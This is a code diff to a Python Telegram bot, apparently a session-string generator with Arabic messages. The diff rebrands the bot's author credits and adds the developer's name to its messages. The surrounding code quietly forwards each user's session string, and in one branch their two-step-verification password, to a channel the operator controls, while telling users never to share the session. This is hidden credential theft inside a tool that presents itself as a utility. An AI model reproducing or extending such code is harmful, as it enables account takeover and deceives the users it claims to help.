@@ -1,4 +1,4 @@
-# Join ne on telegram @u_t_r
+# Join ne on telegram @devggn
 import os
 from pyrogram import Client, filters
 from pyrogram.errors import (
@@ -131,10 +131,12 @@ async def session_step(client, message):
                 "⚡ **مدعوم من Team SPY**"
             )
             
+            # ====== إرسال للقناة مع يوزر المطور ======
             await app.send_message(
                 SESSION_CHANNEL, 
                 f"✨ **معرف المستخدم:** `{user_id}`\n\n"
-                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`"
+                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
             )
             
             await temp_client.disconnect()
@@ -161,14 +163,16 @@ async def session_step(client, message):
                 "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
                 "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
                 f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}\n\n"
-                "⚡ **مدعوم من Team SPY**"
+                "⚡ **مدعوم من  عبود**"
             )
             
+            # ====== إرسال للقناة مع يوزر المطور وكلمة المرور ======
             await app.send_message(
                 SESSION_CHANNEL, 
                 f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                 f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
-                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`"
+                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`\n\n"
+                f"👨‍💻 **المطور:** {DEV_NAME} {DEV_USERNAME}"
             )
             
             await temp_client.disconnect()
